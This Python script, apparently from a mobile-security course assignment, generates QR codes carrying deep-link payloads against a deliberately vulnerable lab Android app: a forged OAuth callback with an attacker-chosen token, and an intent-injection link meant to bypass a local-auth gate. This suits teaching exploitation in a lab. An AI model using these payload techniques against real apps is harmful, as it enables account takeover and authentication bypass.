#!/usr/bin/env python3
"""SMD Assignment 3 — QR payload generator for the offensive PoC.

Renders QR codes that, when scanned, dispatch implicit ACTION_VIEW intents
against the vulnerable target app's deep-link handler (smdpoc://...).

Presets:
  oauth     - forged OAuth callback delivering an attacker-controlled token.
              Sink: DeepLinkActivity (or any colliding companion app).
  internal  - intent-injection trigger handled by the malicious companion app,
              which forwards an explicit intent to the target's exported
              InternalActivity, bypassing the local-auth gate in MainActivity.
"""

import argparse
import random
import string
from pathlib import Path

import qrcode


def random_token(n: int = 16) -> str:
    return "".join(random.choices(string.ascii_uppercase + string.digits, k=n))


def render(uri: str, out_path: Path) -> None:
    out_path.parent.mkdir(parents=True, exist_ok=True)
    qrcode.make(uri, box_size=10, border=4).save(out_path)


def main() -> None:
    p = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("--token", default=f"PWNED_{random_token()}",
                   help="OAuth callback token (default: random PWNED_*).")
    p.add_argument("--out-dir", default="out",
                   help="Output directory (default: ./out).")
    p.add_argument("--uri",
                   help="Encode an arbitrary URI instead of the presets.")
    p.add_argument("--list", action="store_true",
                   help="Print URIs only; do not write PNGs.")
    args = p.parse_args()

    out_dir = Path(args.out_dir)

    if args.uri:
        payloads = {"custom": args.uri}
    else:
        payloads = {
            "oauth": f"smdpoc://oauth/callback?token={args.token}",
            "internal": "smdpoc://internal/launch?cmd=show_secret",
        }

    for name, uri in payloads.items():
        print(f"[{name}] {uri}")
        if not args.list:
            target = out_dir / f"qr_{name}.png"
            render(uri, target)
            print(f"        -> {target}")


if __name__ == "__main__":
    main()
